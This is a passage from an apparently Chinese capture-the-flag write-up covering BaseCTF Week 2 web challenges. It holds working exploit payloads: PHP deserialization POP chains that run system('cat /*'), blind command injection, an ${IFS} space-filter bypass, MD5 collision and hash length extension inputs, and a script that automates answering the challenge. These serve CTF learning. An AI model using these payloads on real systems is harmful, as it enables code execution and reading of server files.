class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]; </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的链子就是</p>
<p>web-&gt;re-&gt;pwn-&gt;misc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw=<span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0=<span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0-&gt;over=<span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;web&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;kw&quot;</span>;O:<span class="number">2</span>:<span class="string">&quot;re&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;chu0&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;pwn&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dusk&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;over&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Misc&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;nothing&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;N;&#125;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;dt&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Week2-一起吃豆豆"><a href="#Week2-一起吃豆豆" class="headerlink" title="[Week2] 一起吃豆豆"></a>[Week2] 一起吃豆豆</h3><p>直接查看源码的index.js仔细看就可以的到一个类似加密的密文</p>
<p><img src="https://luokuang1.github.io/images/base1.png" width="95%" height="80%"></p>
<p>解密的flag</p>
<h3 id="Week2-你听不到我的声音"><a href="#Week2-你听不到我的声音" class="headerlink" title="[Week2] 你听不到我的声音"></a>[Week2] 你听不到我的声音</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>这里直接执行命令没有回显，所以可以通过将命令写入文件来实现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls /&gt;<span class="number">1</span>.txt</span><br><span class="line">cat <span class="comment">/*&gt;1.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="Week2-Really-EZ-POP"><a href="#Week2-Really-EZ-POP" class="headerlink" title="[Week2] Really EZ POP"></a>[Week2] Really EZ POP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123; </span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;system(&quot;cat /*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word=<span class="keyword">new</span> <span class="title class_">Sink</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;sea=<span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;sea-&gt;animal=<span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p>在bp中进行提交</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nature=O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Nature%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>sea%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>Sea%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>animal%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>Shark%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Shark%<span class="number">00</span>word%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Sink%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Sink%<span class="number">00</span>cmd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">22</span>cat+%<span class="number">2</span>F%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<h3 id="Week2-RCEisamazingwithspace"><a href="#Week2-RCEisamazingwithspace" class="headerlink" title="[Week2] RCEisamazingwithspace"></a>[Week2] RCEisamazingwithspace</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]; </span><br><span class="line"><span class="comment">// check if space is present in the command </span></span><br><span class="line"><span class="comment">// use of preg_match to check if space is present in the command </span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$cmd</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Space not allowed in command&#x27;</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// execute the command </span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p>这里进行了空格过滤，尝试了一下不能通过%09来绕过，但是${IFS}可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=cat$&#123;IFS&#125;<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<h3 id="Week2-所以你说你懂-MD5"><a href="#Week2-所以你说你懂-MD5" class="headerlink" title="[Week2] 所以你说你懂 MD5?"></a>[Week2] 所以你说你懂 MD5?</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">// 所以你说你懂 MD5 了? </span></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>]; </span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;加强难度就不会了?&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 什么? 你绕过去了? </span></span><br><span class="line"><span class="comment">// 加大剂量! </span></span><br><span class="line"><span class="comment">// 我要让他成为 string </span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>]; </span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;难吗?不难!&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 你还是绕过去了? </span></span><br><span class="line"><span class="comment">// 哦哦哦, 我少了一个等于号 </span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>]; </span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 你以为这就结束了 </span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 你想看到 random 的值吗? </span></span><br><span class="line"><span class="comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧 </span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>; </span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>; </span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27; </span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不是管理员也来凑热闹?&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;伪造? NO NO NO!&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 认输了, 看样子你真的很懂 MD5 </span></span><br><span class="line"><span class="comment">// 那 flag 就给你吧 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;看样子你真的很懂 MD5&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);加强难度就不会了?</span><br></pre></td></tr></table></figure>
<p>这里有四层</p>
<p>第一层直接通过数组绕过即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>第二层通过md5值为0e开头的字符串即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">appple=s878926199a&amp;bananana=s155964671a</span><br></pre></td></tr></table></figure>
<p>第三层通过强碰撞绕过即可，这里要通过bp不能通过hackbar来传参</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">apppple=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;banananana=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></figure>
<p>第四层通过就是哈希长度扩展，这里就通过hash-ext-attack-master来自动生成</p>
<p>bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16))这里相当于96位的字符串即密钥</p>
<p>name里面后面要添加admin字符串所以我们需要在后面添加一个以admin结尾的字符串，其它任意，这里就随便为qadmin</p>
<p>这里题目会给一个原始的md5值</p>
<p><img src="https://luokuang1.github.io/images/base2.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/base3.png" width="95%" height="80%"></p>
<p>这里最后就可以提交的flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span>&amp;appple=s878926199a&amp;bananana=s155964671a&amp;apppple=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;banananana=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;name=%<span class="number">80</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">03</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>admin&amp;md5=c15df3f0cb8dc43eccdbd0514d79eddb</span><br></pre></td></tr></table></figure>
<h3 id="Week2-数学大师"><a href="#Week2-数学大师" class="headerlink" title="[Week2] 数学大师"></a>[Week2] 数学大师</h3><p>这个就是纯脚本</p>
<blockquote>
<p>每一道题目需要在 5 秒内解出, 传入到 <code>$_POST[&#39;answer&#39;]</code> 中, 解出 50 道即可, 除法取整</p>
</blockquote>
<p>本题依赖 session，请在请求时开启 session cookie</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">session=requests.<span class="title function_ invoke__">Session</span>()</span><br><span class="line">session.cookies.<span class="title function_ invoke__">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>,<span class="string">&quot;bsr9th8eakpubabbiteqrus6uj&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">calculate_expression</span>(expression):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用eval来计算表达式，注意eval有安全风险，实际使用时请确保表达式来源安全</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(expression)</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;Error calculating expression &#123;expression&#125;: &#123;e&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">extract_and_calculate</span>(expression_string):</span><br><span class="line">    <span class="comment"># 使用正则表达式提取数字和运算符组成的表达式</span></span><br><span class="line">    expression = expression_string.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span>(expression)</span><br><span class="line">    <span class="keyword">match</span> = re.<span class="title function_ invoke__">search</span>( r<span class="string">&#x27;\d+[\-\+\*\/]\d+&#x27;</span>, expression)</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">match</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        exp=<span class="keyword">match</span>.<span class="title function_ invoke__">group</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">print</span>(exp)</span><br><span class="line">        result = <span class="title function_ invoke__">calculate_expression</span>(exp)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;No valid expression found in the string.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">send_result</span>(result, send_url):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = &#123;<span class="string">&quot;answer&quot;</span>: result&#125;</span><br><span class="line">        response = session.<span class="title function_ invoke__">post</span>(send_url, data=payload)</span><br><span class="line">        <span class="comment">#response.raise_for_status()  # 检查请求是否成功</span></span><br><span class="line">        data=response.text</span><br><span class="line">        <span class="keyword">print</span>(response.text)</span><br><span class="line">        result = <span class="title function_ invoke__">extract_and_calculate</span>(data)</span><br><span class="line">        <span class="keyword">if</span> result is not None:</span><br><span class="line">            <span class="title function_ invoke__">send_result</span>(result, send_url)</span><br><span class="line">    except requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;Failed to send result: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟的URL，你需要替换成实际的URL</span></span><br><span class="line">fetch_url = <span class="string">&quot;http://challenge.basectf.fun:45312/&quot;</span></span><br><span class="line">send_url = <span class="string">&quot;http://challenge.basectf.fun:45312/&quot;</span></span><br><span class="line"></span><br><span class="line">response = session.<span class="title function_ invoke__">get</span>(fetch_url)</span><br><span class="line"><span class="comment">#response.raise_for_status()  # 检查请求是否成功</span></span><br><span class="line">data = response.text  <span class="comment"># 假设返回的是纯文本</span></span><br><span class="line"><span class="keyword">print</span>(data)</span><br><span class="line">result = <span class="title function_ invoke__">extract_and_calculate</span>(data)</span><br><span class="line"><span class="keyword">if</span> result is not None:</span><br><span class="line">    <span class="title function_ invoke__">send_result</span>(result, send_url)</span><br></pre></td></tr></table></figure>
<p>这个是累计50题，所以直接跑就可以</p>
